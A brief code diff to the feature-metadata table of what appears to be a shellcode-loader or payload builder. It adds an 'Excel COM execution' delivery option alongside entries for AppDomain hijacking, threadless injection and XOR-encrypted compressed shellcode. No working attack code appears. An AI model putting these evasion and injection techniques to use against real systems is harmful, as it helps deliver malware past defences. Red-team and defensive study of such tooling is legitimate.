@@ -17,6 +17,7 @@ const FEATURE_META: Record<Feature, { label: string; desc: string; category: str
   AppDomain:        { label: 'AppDomain Injection',       desc: 'ICLRRuntimeHost2 + .config AppDomainManager hijacking', category: 'Injection' },
   ThreadlessInject: { label: 'Threadless Injection',      desc: 'TpAllocWork callback — no CreateRemoteThread', category: 'Injection' },
   Compress:         { label: 'Compress Payload',          desc: 'Deflate shellcode before XOR-encrypt; C# loaders decompress via System.IO.Compression', category: 'Delivery' },
+  ExcelComExec:     { label: 'Excel COM execution',       desc: 'WSF spawns hidden Excel.Application; shellcode runs inside EXCEL.EXE. Requires Trust Center bypass (Sysmon Event 13). Default off — loud signal.', category: 'Delivery' },
 }
 
 const CATEGORIES = ['Evasion', 'Bypass', 'Injection', 'Sandbox', 'Delivery', 'Misc']
